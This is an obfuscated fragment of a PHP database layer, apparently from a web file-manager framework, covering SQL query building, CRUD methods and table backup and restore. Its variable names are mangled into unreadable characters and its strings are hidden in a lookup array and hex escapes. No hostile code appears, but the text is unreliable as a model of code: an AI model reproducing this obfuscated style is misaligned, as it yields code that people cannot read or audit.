. $this->parseValue($¯é–ºÔ†[1]); } elseif (preg_match($ããĞãµÄ[1107], $¯é–ºÔ†[0])) { $•ÄÒ—Ç .= $Œ§¯› . $ããĞãµÄ[53] . $this->exp[$Ï’şíÀÂ] . $ããĞãµÄ[53] . $this->parseValue($¯é–ºÔ†[1]); } elseif (preg_match($ããĞãµÄ[1108], $¯é–ºÔ†[0])) { if (is_array($¯é–ºÔ†[1])) { $¼ùİî‡ = isset($¯é–ºÔ†[2]) ? strtoupper($¯é–ºÔ†[2]) : $ããĞãµÄ[1093]; if (in_array($¼ùİî‡, array($ããĞãµÄ[1092], $ããĞãµÄ[1093], $ããĞãµÄ[1094]))) { $èÉô‹µÎ = array(); foreach ($¯é–ºÔ†[1] as $‡¹ô°¤µ) { $èÉô‹µÎ[] = $Œ§¯› . $ããĞãµÄ[53] . $this->exp[$Ï’şíÀÂ] . $ããĞãµÄ[53] . $this->parseValue($‡¹ô°¤µ); } $•ÄÒ—Ç .= $ããĞãµÄ[340] . implode($ããĞãµÄ[53] . $¼ùİî‡ . $ããĞãµÄ[53], $èÉô‹µÎ) . $ããĞãµÄ[996]; } } else { $•ÄÒ—Ç .= $Œ§¯› . $ããĞãµÄ[53] . $this->exp[$Ï’şíÀÂ] . $ããĞãµÄ[53] . $this->parseValue($¯é–ºÔ†[1]); } } elseif ($ããĞãµÄ[375] == $Ï’şíÀÂ) { $•ÄÒ—Ç .= $ããĞãµÄ[994] . $Œ§¯› . $ããĞãµÄ[53] . $¯é–ºÔ†[1] . $ããĞãµÄ[1109]; } elseif (preg_match($ããĞãµÄ[1110], $¯é–ºÔ†[0])) { $•ÄÒ—Ç .= $¯é–ºÔ†[0]; } elseif (preg_match($ããĞãµÄ[1111], $¯é–ºÔ†[0])) { if (isset($¯é–ºÔ†[2]) && $ããĞãµÄ[375] == $¯é–ºÔ†[2]) { $•ÄÒ—Ç .= $Œ§¯› . $ããĞãµÄ[53] . $this->exp[$Ï’şíÀÂ] . $ããĞãµÄ[53] . $¯é–ºÔ†[1]; } else { if (is_string($¯é–ºÔ†[1])) { $¯é–ºÔ†[1] = explode($ããĞãµÄ[50], $¯é–ºÔ†[1]); } $‰ßÛÄÜ = implode($ããĞãµÄ[50], $this->parseValue($¯é–ºÔ†[1])); $•ÄÒ—Ç .= $Œ§¯› . $ããĞãµÄ[53] . $this->exp[$Ï’şíÀÂ] . $ããĞãµÄ[994] . $‰ßÛÄÜ . $ããĞãµÄ[996]; } } elseif (preg_match($ããĞãµÄ[1112], $¯é–ºÔ†[0])) { $²Ö®£Úô = is_string($¯é–ºÔ†[1]) ? explode($ããĞãµÄ[50], $¯é–ºÔ†[1]) : $¯é–ºÔ†[1]; $•ÄÒ—Ç .= $ããĞãµÄ[994] . $Œ§¯› . $ããĞãµÄ[53] . $this->exp[$Ï’şíÀÂ] . $ããĞãµÄ[53] . $this->parseValue($²Ö®£Úô[0]) . $ããĞãµÄ[1095] . $this->parseValue($²Ö®£Úô[1]) . $ããĞãµÄ[358]; } else { think_exception(think_lang($ããĞãµÄ[1098]) . $ããĞãµÄ[4] . $¯é–ºÔ†[0]); } } else { $¤Ö·º‡— = count($¯é–ºÔ†); $£Ô‚Éğ‘ = $ããĞãµÄ[12]; if (is_string($¯é–ºÔ†[$¤Ö·º‡— - 1])) { $£Ô‚Éğ‘ = isset($¯é–ºÔ†[$¤Ö·º‡— - 1]) ? strtoupper($¯é–ºÔ†[$¤Ö·º‡— - 1]) : $ããĞãµÄ[12]; if (in_array($£Ô‚Éğ‘, array($ããĞãµÄ[1092], $ããĞãµÄ[1093], $ããĞãµÄ[1094]))) { $¤Ö·º‡— = $¤Ö·º‡— - 1; } } else { $£Ô‚Éğ‘ = $ããĞãµÄ[1092]; } for ($Ùñ‘ù‹Ñ = 0; $Ùñ‘ù‹Ñ < $¤Ö·º‡—; $Ùñ‘ù‹Ñ++) { $²Ö®£Úô = is_array($¯é–ºÔ†[$Ùñ‘ù‹Ñ]) ? $¯é–ºÔ†[$Ùñ‘ù‹Ñ][1] : $¯é–ºÔ†[$Ùñ‘ù‹Ñ]; if ($ããĞãµÄ[375] == strtolower($¯é–ºÔ†[$Ùñ‘ù‹Ñ][0])) { $•ÄÒ—Ç .= $ããĞãµÄ[340] . $Œ§¯› . $ããĞãµÄ[53] . $²Ö®£Úô . $ããĞãµÄ[1109] . $£Ô‚Éğ‘ . $ããĞãµÄ[53]; } else { $®ñÇ¾ê½ = is_array($¯é–ºÔ†[$Ùñ‘ù‹Ñ]) ? $this->exp[strtolower($¯é–ºÔ†[$Ùñ‘ù‹Ñ][0])] : $ããĞãµÄ[518]; if (!$®ñÇ¾ê½ && is_array($¯é–ºÔ†[$Ùñ‘ù‹Ñ]) && in_array($¯é–ºÔ†[$Ùñ‘ù‹Ñ][0], array($ããĞãµÄ[518], $ããĞãµÄ[1102], $ããĞãµÄ[1103], $ããĞãµÄ[1104], $ããĞãµÄ[1105], $ããĞãµÄ[1106]))) { $®ñÇ¾ê½ = $¯é–ºÔ†[$Ùñ‘ù‹Ñ][0]; } $•ÄÒ—Ç .= $ããĞãµÄ[340] . $Œ§¯› . $ããĞãµÄ[53] . $®ñÇ¾ê½ . $ããĞãµÄ[53] . $this->parseValue($²Ö®£Úô) . $ããĞãµÄ[1109] . $£Ô‚Éğ‘ . $ããĞãµÄ[53]; } } $•ÄÒ—Ç = substr($•ÄÒ—Ç, 0, -4); } } else { $•ÄÒ—Ç .= $Œ§¯› . $ããĞãµÄ[1113] . $this->parseValue($¯é–ºÔ†); } return $•ÄÒ—Ç; } protected function parseThinkWhere($”°òüğ£, $€Œ¤¾ÛÊ) { $û‹ÃÕºê =& $_SERVER[ˆö¿ÚÌ¼]; $©âÀş²Å = $û‹ÃÕºê[12]; switch ($”°òüğ£) { case $û‹ÃÕºê[430]: $©âÀş²Å = $€Œ¤¾ÛÊ; break; case $û‹ÃÕºê[1096]: $©âÀş²Å = is_string($€Œ¤¾ÛÊ) ? $€Œ¤¾ÛÊ : substr($this->parseWhere($€Œ¤¾ÛÊ), 6); break; case $û‹ÃÕºê[1114]: parse_str($€Œ¤¾ÛÊ, $½şúìÜ¿); if (isset($½şúìÜ¿[$û‹ÃÕºê[1091]])) { $æâñˆí = $û‹ÃÕºê[53] . strtoupper($½şúìÜ¿[$û‹ÃÕºê[1091]]) . $û‹ÃÕºê[53]; unset($½şúìÜ¿[$û‹ÃÕºê[1091]]); } else { $æâñˆí = $û‹ÃÕºê[1095]; } $—ô†•ƒ = array(); foreach ($½şúìÜ¿ as $¬íŸØ„ê => $†É””àæ) { $—ô†•ƒ[] = $this->parseKey($¬íŸØ„ê) . $û‹ÃÕºê[1113] . $this->parseValue($†É””àæ); } $©âÀş²Å = implode($æâñˆí, $—ô†•ƒ); break; } return $©âÀş²Å; } protected function parseLimit($›ë£ƒÙ«) { $š¡ÀÎÇ =& $_SERVER[ˆö¿ÚÌ¼]; return !empty($›ë£ƒÙ«) ? $š¡ÀÎÇ[51] . $›ë£ƒÙ« . $š¡ÀÎÇ[53] : $š¡ÀÎÇ[12]; } protected function parseJoin($´‚èß¼¸) { $‰§Éí÷… =& $_SERVER[ˆö¿ÚÌ¼]; $à–—Ó = $‰§Éí÷…[12]; if (!empty($´‚èß¼¸)) { if (is_array($´‚èß¼¸)) { foreach ($´‚èß¼¸ as $‘ïßÊÜä => $£â±Ó¯ã) { if (!1 !== stripos($£â±Ó¯ã, $‰§Éí÷…[1115])) { $à–—Ó .= $‰§Éí÷…[53] . $£â±Ó¯ã; } else { $à–—Ó .= $‰§Éí÷…[1116] . $£â±Ó¯ã; } } } else { $à–—Ó .= $‰§Éí÷…[1116] . $´‚èß¼¸; } } $à–—Ó = preg_replace($‰§Éí÷…[1117], think_config($‰§Éí÷…[1021]) . $‰§Éí÷…[1118], $à–—Ó); return $à–—Ó; } protected function parseOrder($ ¤Şˆ¥Ş) { $İôâûŞ¨ =& $_SERVER[ˆö¿ÚÌ¼]; if (is_array($ ¤Şˆ¥Ş)) { $‚‚‚¶Óå = array(); foreach ($ ¤Şˆ¥Ş as $°ÔëÂé => $ı¯ÚáÄœ) { if (is_numeric($°ÔëÂé)) { $‚‚‚¶Óå[] = $this->parseKey($ı¯ÚáÄœ); } else { $ı¯ÚáÄœ = in_array(strtoupper(trim($ı¯ÚáÄœ)), array($İôâûŞ¨[1119], $İôâûŞ¨[1120])) ? $İôâûŞ¨[53] . $ı¯ÚáÄœ : $İôâûŞ¨[12]; if (preg_match($İôâûŞ¨[1121], $°ÔëÂé)) { $‚‚‚¶Óå[] = $this->parseKey($°ÔëÂé) . $ı¯ÚáÄœ; } else { think_exception($İôâûŞ¨[1122] . $°ÔëÂé); } } } $ ¤Şˆ¥Ş = implode($İôâûŞ¨[50], $‚‚‚¶Óå); } return !empty($ ¤Şˆ¥Ş) ? $İôâûŞ¨[1123] . $ ¤Şˆ¥Ş : $İôâûŞ¨[12]; } protected function parseGroup($Ä¼†«­Ş) { $°”ì¨Õ© =& $_SERVER[ˆö¿ÚÌ¼]; return !empty($Ä¼†«­Ş) ? $°”ì¨Õ©[1124] . $Ä¼†«­Ş : $°”ì¨Õ©[12]; } protected function parseHaving($Á‘É³·) { $ı¬½²ŸÉ =& $_SERVER[ˆö¿ÚÌ¼]; return !empty($Á‘É³·) ? $ı¬½²ŸÉ[1125] . $Á‘É³· : $ı¬½²ŸÉ[12]; } protected function parseComment($ò–¶¦Ş±) { $ÂÁ³œ™İ =& $_SERVER[ˆö¿ÚÌ¼]; return !empty($ò–¶¦Ş±) ? $ÂÁ³œ™İ[1126] . $ò–¶¦Ş± . $ÂÁ³œ™İ[1127] : $ÂÁ³œ™İ[12]; } protected function parseDistinct($ıîô»†) { $Ÿç€×Æ =& $_SERVER[ˆö¿ÚÌ¼]; return !empty($ıîô»†) ? $Ÿç€×Æ[1128] : $Ÿç€×Æ[12]; } protected function parseUnion($óÊû—Õ) { $’²÷é¶û =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($óÊû—Õ)) { return $’²÷é¶û[12]; } if (isset($óÊû—Õ[$’²÷é¶û[426]])) { $®¦ÓÂ¦ = $’²÷é¶û[1129]; unset($óÊû—Õ[$’²÷é¶û[426]]); } else { $®¦ÓÂ¦ = $’²÷é¶û[1130]; } foreach ($óÊû—Õ as $»µÅÉ) { $€¶¼Ö½í[] = $®¦ÓÂ¦ . (is_array($»µÅÉ) ? $this->buildSelectSql($»µÅÉ) : $»µÅÉ); } return implode($’²÷é¶û[53], $€¶¼Ö½í); } public function insert($´Öæ´’¾, $¥Ôúã”‡ = array(), $ŠëöÓƒ = false) { $ç’ä‡œ =& $_SERVER[ˆö¿ÚÌ¼]; $‚Ò¯úŠ… = $Ä—ÙÄ¯Á = array(); $this->model = $¥Ôúã”‡[$ç’ä‡œ[361]]; foreach ($´Öæ´’¾ as $‡Œ¥Ìí => $äêğ‰ú‚) { if (is_array($äêğ‰ú‚) && $ç’ä‡œ[375] == $äêğ‰ú‚[0]) { $Ä—ÙÄ¯Á[] = $this->parseKey($‡Œ¥Ìí); $‚Ò¯úŠ…[] = $äêğ‰ú‚[1]; } elseif (is_scalar($äêğ‰ú‚) || is_null($äêğ‰ú‚)) { $Ä—ÙÄ¯Á[] = $this->parseKey($‡Œ¥Ìí); $‚Ò¯úŠ…[] = $this->parseValue($äêğ‰ú‚); } } $¡¢ÌÍË = ($ŠëöÓƒ ? $ç’ä‡œ[998] : $ç’ä‡œ[999]) . $ç’ä‡œ[1000] . $this->parseTable($¥Ôúã”‡[$ç’ä‡œ[359]]) . $ç’ä‡œ[994] . implode($ç’ä‡œ[50], $Ä—ÙÄ¯Á) . $ç’ä‡œ[995] . implode($ç’ä‡œ[50], $‚Ò¯úŠ…) . $ç’ä‡œ[996]; $¡¢ÌÍË .= $this->parseLock(isset($¥Ôúã”‡[$ç’ä‡œ[934]]) ? $¥Ôúã”‡[$ç’ä‡œ[934]] : !1); $¡¢ÌÍË .= $this->parseComment(!empty($¥Ôúã”‡[$ç’ä‡œ[432]]) ? $¥Ôúã”‡[$ç’ä‡œ[432]] : $ç’ä‡œ[12]); return $this->execute($¡¢ÌÍË, $this->parseBind(!empty($¥Ôúã”‡[$ç’ä‡œ[363]]) ? $¥Ôúã”‡[$ç’ä‡œ[363]] : array())); } public function selectInsert($¸’±¸Û, $‰ì˜­˜­, $¼óºÅ© = array()) { $îÛì =& $_SERVER[ˆö¿ÚÌ¼]; $this->model = $¼óºÅ©[$îÛì[361]]; if (is_string($¸’±¸Û)) { $¸’±¸Û = explode($îÛì[50], $¸’±¸Û); } array_walk($¸’±¸Û, array($this, $îÛì[997])); $®«¡ìÏ• = $îÛì[1131] . $this->parseTable($‰ì˜­˜­) . $îÛì[994] . implode($îÛì[50], $¸’±¸Û) . $îÛì[1109]; $®«¡ìÏ• .= $this->buildSelectSql($¼óºÅ©); return $this->execute($®«¡ìÏ•, $this->parseBind(!empty($¼óºÅ©[$îÛì[363]]) ? $¼óºÅ©[$îÛì[363]] : array())); } public function update($çËÅˆÌ“, $Á“„â–) { $ìñµ©´® =& $_SERVER[ˆö¿ÚÌ¼]; $this->model = $Á“„â–[$ìñµ©´®[361]]; $çùíÙëø = $ìñµ©´®[1132] . $this->parseTable($Á“„â–[$ìñµ©´®[359]]) . $this->parseSet($çËÅˆÌ“) . $this->parseWhere(!empty($Á“„â–[$ìñµ©´®[355]]) ? $Á“„â–[$ìñµ©´®[355]] : $ìñµ©´®[12]) . $this->parseOrder(!empty($Á“„â–[$ìñµ©´®[444]]) ? $Á“„â–[$ìñµ©´®[444]] : $ìñµ©´®[12]) . $this->parseLimit(!empty($Á“„â–[$ìñµ©´®[370]]) ? $Á“„â–[$ìñµ©´®[370]] : $ìñµ©´®[12]) . $this->parseLock(isset($Á“„â–[$ìñµ©´®[934]]) ? $Á“„â–[$ìñµ©´®[934]] : !1) . $this->parseComment(!empty($Á“„â–[$ìñµ©´®[432]]) ? $Á“„â–[$ìñµ©´®[432]] : $ìñµ©´®[12]); return $this->execute($çùíÙëø, $this->parseBind(!empty($Á“„â–[$ìñµ©´®[363]]) ? $Á“„â–[$ìñµ©´®[363]] : array())); } public function delete($£Ñ³†„Õ = array()) { $¯ë‡È£€ =& $_SERVER[ˆö¿ÚÌ¼]; $this->model = $£Ñ³†„Õ[$¯ë‡È£€[361]]; $öÇÔ³” = $¯ë‡È£€[1133] . $this->parseTable($£Ñ³†„Õ[$¯ë‡È£€[359]]) . $this->parseWhere(!empty($£Ñ³†„Õ[$¯ë‡È£€[355]]) ? $£Ñ³†„Õ[$¯ë‡È£€[355]] : $¯ë‡È£€[12]) . $this->parseOrder(!empty($£Ñ³†„Õ[$¯ë‡È£€[444]]) ? $£Ñ³†„Õ[$¯ë‡È£€[444]] : $¯ë‡È£€[12]) . $this->parseLimit(!empty($£Ñ³†„Õ[$¯ë‡È£€[370]]) ? $£Ñ³†„Õ[$¯ë‡È£€[370]] : $¯ë‡È£€[12]) . $this->parseLock(isset($£Ñ³†„Õ[$¯ë‡È£€[934]]) ? $£Ñ³†„Õ[$¯ë‡È£€[934]] : !1) . $this->parseComment(!empty($£Ñ³†„Õ[$¯ë‡È£€[432]]) ? $£Ñ³†„Õ[$¯ë‡È£€[432]] : $¯ë‡È£€[12]); return $this->execute($öÇÔ³”, $this->parseBind(!empty($£Ñ³†„Õ[$¯ë‡È£€[363]]) ? $£Ñ³†„Õ[$¯ë‡È£€[363]] : array())); } public function select($‘¦ğş‚­ = array()) { $ïÆ–ÂÑí =& $_SERVER[ˆö¿ÚÌ¼]; $this->model = $‘¦ğş‚­[$ïÆ–ÂÑí[361]]; $ÕËËîÆŸ = $this->buildSelectSql($‘¦ğş‚­); $ÉÑŠ Ôš = isset($‘¦ğş‚­[$ïÆ–ÂÑí[427]]) ? $‘¦ğş‚­[$ïÆ–ÂÑí[427]] : !1; if ($ÉÑŠ Ôš) { $Åó¯·¤³ = is_string($ÉÑŠ Ôš[$ïÆ–ÂÑí[97]]) ? $ÉÑŠ Ôš[$ïÆ–ÂÑí[97]] : $ïÆ–ÂÑí[1134] . md5($ÕËËîÆŸ); $Õß‡‰ï™ = think_cache($Åó¯·¤³, $ïÆ–ÂÑí[12], $ÉÑŠ Ôš); if (!1 !== $Õß‡‰ï™) { return $Õß‡‰ï™; } } $õÁ‡§ÖÊ = $this->query($ÕËËîÆŸ, $this->parseBind(!empty($‘¦ğş‚­[$ïÆ–ÂÑí[363]]) ? $‘¦ğş‚­[$ïÆ–ÂÑí[363]] : array())); if ($ÉÑŠ Ôš && !1 !== $õÁ‡§ÖÊ) { think_cache($Åó¯·¤³, $õÁ‡§ÖÊ, $ÉÑŠ Ôš); } return $õÁ‡§ÖÊ; } public function buildSelectSql($Œ¨ö‰Ì× = array()) { $‚ÅŠØ¸ =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($Œ¨ö‰Ì×[$‚ÅŠØ¸[431]])) { if (strpos($Œ¨ö‰Ì×[$‚ÅŠØ¸[431]], $‚ÅŠØ¸[50])) { list($ÚÑÎ¿´, $´—““Õ) = explode($‚ÅŠØ¸[50], $Œ¨ö‰Ì×[$‚ÅŠØ¸[431]]); } else { $ÚÑÎ¿´ = $Œ¨ö‰Ì×[$‚ÅŠØ¸[431]]; } $ÚÑÎ¿´ = $ÚÑÎ¿´ ? $ÚÑÎ¿´ : 1; $´—““Õ = isset($´—““Õ) ? $´—““Õ : (is_numeric($Œ¨ö‰Ì×[$‚ÅŠØ¸[370]]) ? $Œ¨ö‰Ì×[$‚ÅŠØ¸[370]] : 20); $¤ğ½Èüµ = $´—““Õ * ((int) $ÚÑÎ¿´ - 1); $Œ¨ö‰Ì×[$‚ÅŠØ¸[370]] = $¤ğ½Èüµ . $‚ÅŠØ¸[50] . $´—““Õ; } if (think_config($‚ÅŠØ¸[1135])) { $ëˆµÀõ  = $‚ÅŠØ¸[1136] . md5(serialize($Œ¨ö‰Ì×)); $šˆ¤ÓÜ = think_cache($ëˆµÀõ ); if ($šˆ¤ÓÜ) { return $šˆ¤ÓÜ; } } $›Òë•Ó€ = $this->parseSql($this->selectSql, $Œ¨ö‰Ì×); $›Òë•Ó€ .= $this->parseLock(isset($Œ¨ö‰Ì×[$‚ÅŠØ¸[934]]) ? $Œ¨ö‰Ì×[$‚ÅŠØ¸[934]] : !1); if (isset($ëˆµÀõ )) { think_cache($ëˆµÀõ , $›Òë•Ó€); } return $›Òë•Ó€; } public function parseSql($”òÂÔúë, $ö§âêË² = array()) { $şĞÊ¿â­ =& $_SERVER[ˆö¿ÚÌ¼]; $”òÂÔúë = str_replace(array($şĞÊ¿â­[1137], $şĞÊ¿â­[1138], $şĞÊ¿â­[1139], $şĞÊ¿â­[1140], $şĞÊ¿â­[1141], $şĞÊ¿â­[1142], $şĞÊ¿â­[1143], $şĞÊ¿â­[1144], $şĞÊ¿â­[1145], $şĞÊ¿â­[1146], $şĞÊ¿â­[1147]), array($this->parseTable("{$ö§âêË²[$şĞÊ¿â­[359]]}"), $this->parseDistinct(isset($ö§âêË²[$şĞÊ¿â­[1148]]) ? $ö§âêË²[$şĞÊ¿â­[1148]] : !1), $this->parseField(!empty($ö§âêË²[$şĞÊ¿â­[353]]) ? $ö§âêË²[$şĞÊ¿â­[353]] : $şĞÊ¿â­[223]), $this->parseJoin(!empty($ö§âêË²[$şĞÊ¿â­[362]]) ? $ö§âêË²[$şĞÊ¿â­[362]] : $şĞÊ¿â­[12]), $this->parseWhere(!empty($ö§âêË²[$şĞÊ¿â­[355]]) ? $ö§âêË²[$şĞÊ¿â­[355]] : $şĞÊ¿â­[12]), $this->parseGroup(!empty($ö§âêË²[$şĞÊ¿â­[592]]) ? $ö§âêË²[$şĞÊ¿â­[592]] : $şĞÊ¿â­[12]), $this->parseHaving(!empty($ö§âêË²[$şĞÊ¿â­[1149]]) ? $ö§âêË²[$şĞÊ¿â­[1149]] : $şĞÊ¿â­[12]), $this->parseOrder(!empty($ö§âêË²[$şĞÊ¿â­[444]]) ? $ö§âêË²[$şĞÊ¿â­[444]] : $şĞÊ¿â­[12]), $this->parseLimit(!empty($ö§âêË²[$şĞÊ¿â­[370]]) ? $ö§âêË²[$şĞÊ¿â­[370]] : $şĞÊ¿â­[12]), $this->parseUnion(!empty($ö§âêË²[$şĞÊ¿â­[425]]) ? $ö§âêË²[$şĞÊ¿â­[425]] : $şĞÊ¿â­[12]), $this->parseComment(!empty($ö§âêË²[$şĞÊ¿â­[432]]) ? $ö§âêË²[$şĞÊ¿â­[432]] : $şĞÊ¿â­[12])), $”òÂÔúë); return $”òÂÔúë; } public function getLastSql($´ÈÙßÛ = '') { return $´ÈÙßÛ ? $this->modelSql[$´ÈÙßÛ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($É¸ö¹”µ) { return addslashes($É¸ö¹”µ); } public function setModel($ùèÚ®û¦) { $this->model = $ùèÚ®û¦; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¡Ñ¢üæß = array()) { $âäÅ¶ˆø =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($¡Ñ¢üæß)) { $¡Ñ¢üæß = $GLOBALS[$âäÅ¶ˆø[6]][$âäÅ¶ˆø[21]]; } $this->database = $¡Ñ¢üæß; } public function model($£çŒêÉ· = '') { return new ModelBase($£çŒêÉ·, $_SERVER[ˆö¿ÚÌ¼][12], $this->database); } public function db($ÉİµŠ = false) { $óÅŠóÓ =& $_SERVER[ˆö¿ÚÌ¼]; $×Â¦±Èø = array_change_key_case($this->database); if ($this->dbType() == $óÅŠóÓ[13] || !$ÉİµŠ) { return $this->model()->db(); } $§«©¢ù– = $×Â¦±Èø[$óÅŠóÓ[1063]]; $×Â¦±Èø[$óÅŠóÓ[1063]] = $óÅŠóÓ[12]; if ($×Â¦±Èø[$óÅŠóÓ[1058]] == $óÅŠóÓ[1055]) { $ĞÍƒ Ë = $×Â¦±Èø[$óÅŠóÓ[1064]]; $×Â¦±Èø[$óÅŠóÓ[1064]] = substr($ĞÍƒ Ë, 0, strrpos($ĞÍƒ Ë, $óÅŠóÓ[1150])); } $this->database = $×Â¦±Èø; $ÏÅÇÃ’ = $this->model()->db(); try { $õÕ÷Î‘Ä = $ÏÅÇÃ’->execute("\163\x68\157\x77\x20\144\141\164\x61\142\x61\x73\145\163\40\x6c\151\153\145\x20\47{$§«©¢ù–}\x27"); } catch (Exception $€îäÊ€) { } if (!$õÕ÷Î‘Ä) { $ÏÅÇÃ’->execute("\143\162\x65\x61\164\145\x20\x64\141\164\x61\x62\141\163\x65\x20\140{$§«©¢ù–}\x60"); } $×Â¦±Èø[$óÅŠóÓ[1063]] = $§«©¢ù–; if ($×Â¦±Èø[$óÅŠóÓ[1058]] == $óÅŠóÓ[1055]) { $×Â¦±Èø[$óÅŠóÓ[1064]] .= $óÅŠóÓ[1150] . $§«©¢ù–; } $this->database = $×Â¦±Èø; $ÏÅÇÃ’->execute("\165\163\145\x20\140{$§«©¢ù–}\x60"); return $ÏÅÇÃ’; } public function createTable($×˜³‹ƒä, &$‡ê¿èË‡) { $¾Ùù¥ß =& $_SERVER[ˆö¿ÚÌ¼]; if (!IO::exist($×˜³‹ƒä)) { ActionCall($¾Ùù¥ß[1151], !0, 0); show_json(LNG($¾Ùù¥ß[1152]), !1); } $š—±Ì = $this->model()->db(); $Û½×«û = sqlSplit(IO::getContent($×˜³‹ƒä)); foreach ($Û½×«û as $ÁöçÆŸÏ) { $…ç—Ü‘¬ = stripos($ÁöçÆŸÏ, $¾Ùù¥ß[1153]) === 0; if ($…ç—Ü‘¬) { $‡ê¿èË‡->task[$¾Ùù¥ß[1154]] += 1; } $š—±Ì->execute($ÁöçÆŸÏ); if ($…ç—Ü‘¬) { preg_match($¾Ùù¥ß[1155], $ÁöçÆŸÏ, $Æóºá‘˜); $‡ê¿èË‡->task[$¾Ùù¥ß[1156]] = $Æóºá‘˜[1]; $‡ê¿èË‡->update(1); } } } public function insertTable($¾Õ‰ÛÖì, &$ú´ÓÇ“) { $ÊÖõ€¯À =& $_SERVER[ˆö¿ÚÌ¼]; $Ôñ­Š¢ˆ = $this->model()->db(); $äæ·­ıå = $‡²ñã—Œ ? array($‡²ñã—Œ) : $Ôñ­Š¢ˆ->getTables(); foreach ($¾Õ‰ÛÖì as $®Ä¯ş·) { $‡²ñã—Œ = basename($®Ä¯ş·, $ÊÖõ€¯À[875]); if (!in_array($‡²ñã—Œ, $äæ·­ıå)) { continue; } $ú´ÓÇ“->task[$ÊÖõ€¯À[1156]] = $‡²ñã—Œ; if (get_filesize($®Ä¯ş·) == 0) { continue; } $õ ëÌü = $this->sqlToDb($®Ä¯ş·, $ú´ÓÇ“); if (!$õ ëÌü) { ActionCall($ÊÖõ€¯À[1151], !0, 0); show_json(LNG($ÊÖõ€¯À[1157]) . "\133{$‡²ñã—Œ}\135", !1); } } } public function sqlFromDb($¦€¿‚¿, $Ø¦Ï¾Õ¨, &$•ê§Ò², $û‡ĞÎ‘§ = '') { if ($•ê§Ò²) { $•ê§Ò²->task[$_SERVER[ˆö¿ÚÌ¼][1156]] = $¦€¿‚¿; } $»ñ¥äÒµ = $this->model($¦€¿‚¿); $Á§½Ş³Œ = 0; $€¼Âöˆô = 0; $ì§»ê×È = 10000; $¾Á…ıª = fopen($Ø¦Ï¾Õ¨, $_SERVER[ˆö¿ÚÌ¼][1158]); $‰„¼ïü… = $»ñ¥äÒµ->getPk(); $¸†¡±ó² = $»ñ¥äÒµ->getDbFields(); $Ø›¢­çú = $_SERVER[ˆö¿ÚÌ¼][12]; if ($GLOBALS[$_SERVER[ˆö¿ÚÌ¼][874]] && in_array($¦€¿‚¿, array($_SERVER[ˆö¿ÚÌ¼][1159], $_SERVER[ˆö¿ÚÌ¼][1160]))) { $Ø›¢­çú = $¦€¿‚¿; } do { $ø¥’Ê = array($‰„¼ïü… => array($_SERVER[ˆö¿ÚÌ¼][1105], $€¼Âöˆô)); $ˆğ´‹ª = $»ñ¥äÒµ->where($ø¥’Ê)->field($¸†¡±ó²)->order($‰„¼ïü… . $_SERVER[ˆö¿ÚÌ¼][1161])->limit($ì§»ê×È)->select(); $ˆğ´‹ª = !empty($ˆğ´‹ª) ? $ˆğ´‹ª : array(); if (!($ğ‰ó‘çœ = count($ˆğ´‹ª))) { break; } $¾…çßˆ = end($ˆğ´‹ª); $€¼Âöˆô = $¾…çßˆ[$‰„¼ïü…]; $Ü«ŞõĞ¢ = array(); foreach ($ˆğ´‹ª as $Ò¹öÛµÁ) { if ($Ø›¢­çú) { if ($¦€¿‚¿ == $_SERVER[ˆö¿ÚÌ¼][1159]) { if ($Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][33]] == $_SERVER[ˆö¿ÚÌ¼][1162]) { $€„˜ï³— = json_decode($Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][453]], !0); if ($€„˜ï³—[$_SERVER[ˆö¿ÚÌ¼][32]] == $GLOBALS[$_SERVER[ˆö¿ÚÌ¼][874]] && $€„˜ï³—[$_SERVER[ˆö¿ÚÌ¼][835]] != 1) { continue; } } } else { if ($Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][33]] == $_SERVER[ˆö¿ÚÌ¼][1163] && $Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][97]] == $_SERVER[ˆö¿ÚÌ¼][870]) { continue; } } } if ($û‡ĞÎ‘§) { $Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][87]] = "\x7b\151\x6f\72{$û‡ĞÎ‘§}\175" . substr($Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][87]], strlen("\x7b\151\x6f\x3a{$Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][908]]}\175")); $Ò¹öÛµÁ[$_SERVER[ˆö¿ÚÌ¼][908]] = $û‡ĞÎ‘§; } $Ü«ŞõĞ¢[] = $_SERVER[ˆö¿ÚÌ¼][1164] . $this->sqlEncode($Ò¹öÛµÁ) . $_SERVER[ˆö¿ÚÌ¼][1165]; } $ÊÎÏíÂÜ = "\x49\x4e\123\105\122\124\x20\x49\x4e\124\x4f\40\x60{$¦€¿‚¿}\140\40\x28\140" . implode($_SERVER[ˆö¿ÚÌ¼][1166], $¸†¡±ó²) . $_SERVER[ˆö¿ÚÌ¼][1167]; fwrite($¾Á…ıª, $ÊÎÏíÂÜ . implode($_SERVER[ˆö¿ÚÌ¼][1168], $Ü«ŞõĞ¢) . $_SERVER[ˆö¿ÚÌ¼][74] . PHP_EOL); $Á§½Ş³Œ += $ğ‰ó‘çœ; if ($•ê§Ò²) { $•ê§Ò²->update($ğ‰ó‘çœ); } } while ($ì§»ê×È == $ğ‰ó‘çœ); fclose($¾Á…ıª); return $Á§½Ş³Œ; } public function sqlToDb($ÕŠ™ÀØ, &$ÅÃè×öà) { $­«£×ä˜ =& $_SERVER[ˆö¿ÚÌ¼]; $·€¾ÌÀç = $this->model()->db(); $Ã§Ê²— = @fopen($ÕŠ™ÀØ, $­«£×ä˜[1169]); if (!$Ã§Ê²—) { return !1; } $È³ö£Œ = 0; $£êï·û› = $­«£×ä˜[12]; $§«êæíñ = array(); $»…ó‹²” = $this->dbType(); $èÂµøÏ½ = $»…ó‹²” == $­«£×ä˜[13] ? 500 : 2000; $öª†ï÷ç = basename($ÕŠ™ÀØ, $­«£×ä˜[875]); $õòßÛÖÜ = 0; $Èû£Áâ¸ = 4194304; while (!feof($Ã§Ê²—)) { $éÎŞ“å = trim(fgets($Ã§Ê²—)); if (!$éÎŞ“å) { continue; } $³ÑË‡²– = 